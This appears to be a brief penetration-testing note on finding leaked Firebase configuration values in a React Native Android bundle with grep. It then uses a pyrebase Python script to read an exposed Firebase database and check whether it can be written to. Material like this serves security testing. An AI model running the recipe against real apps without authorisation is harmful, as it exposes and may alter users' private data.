# Firebase API Leak

Perform a grep on index.android.bundle with the following strings:

```
FIREBASE_API_KEY
FIREBASE_AUTH_DOMAIN
FIREBASE_DB_URL
FIREBASE_BUCKET
apiKey
```

Or search it on the un-minified source.

## Interact with the Firebase server

If the Firebase API key was retrieve it is possible to access the Firebase database.

Install the pyrebase: `pip install pyrebase`

The following python script can be used to get the Firebase DB:

```
import pyrebase

config = {
  "apiKey": "FIREBASE_API_KEY",
  "authDomain": "FIREBASE_AUTH_DOMAIN_ID.firebaseapp.com",
  "databaseURL": "https://FIREBASE_AUTH_DOMAIN_ID.firebaseio.com",
  "storageBucket": "FIREBASE_AUTH_DOMAIN_ID.appspot.com",
}

firebase = pyrebase.initialize_app(config)

db = firebase.database()

print(db.get())
```

Check also if it is possible to write data (https://github.com/thisbejim/Pyrebase)